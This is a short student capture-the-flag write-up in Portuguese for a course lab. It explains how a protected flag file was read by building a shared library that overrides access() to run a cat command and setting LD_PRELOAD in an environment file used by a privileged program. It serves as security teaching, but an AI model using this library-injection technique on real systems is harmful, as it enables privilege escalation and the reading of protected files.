
# CTF 2 - Semana 4
## Análise 
Ao entrar em ctf-fsi.fe.up.pt 4006 ,analisamos o que estava no diretório inicial: /home/flag_reader, em que no admin_note.txt diz-nos que a flag foi acedida e roubada por hackers em /tmp e ao analisar main.c percebemos que a flag está no diretório /flags/flag.txt em que não conseguimos aceder a /flags

## Procedimento
Começamos por criar um programa new.c em /tmp e adicionamos-lo a uma libraria new.so ao usar os seguintes comandos :

```shell
touch new.c
cat > novo.c  
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

    int access(const char * str, int mode){
        system("/bin/cat /flags/flag.txt > /tmp/flag.txt");
    return 0;
}
```

Aqui disconectamos da ligaçao ao servidor guardando o ficheiro new.c e voltamos a conectar 


```shell
cd /tmp
touch new.so
gcc -shared -o new.so -fPIC new.c
```

A funçao access vai usar o comando cat que vai ler o conteudo de /flags/flag.txt e vai redirecionar o output para /tmp/flag.txt

De seguida criamos o ficheiro que vai conter a flag e alteramos as suas permissoes para escrever,ler e ser executado:

```shell
touch /tmp/flag.txt
chmod 777 /tmp/flag.txt
```

Por ultimo mudamos a environment variable LD_PRELOAD para o path /tmp/new.so 

```shell
echo "LD_PRELOAD=/tmp/new.so" > env
```
Assim sempre que correr um programa que use a funçao access (usada para ver se o ficheiro existe) vai correr a funçao access em new.c em vez de verificar se um ficheiro existe

Finalmente conseguimos ler a flag usando :

```shell
cat /tmp/flag.txt 
```
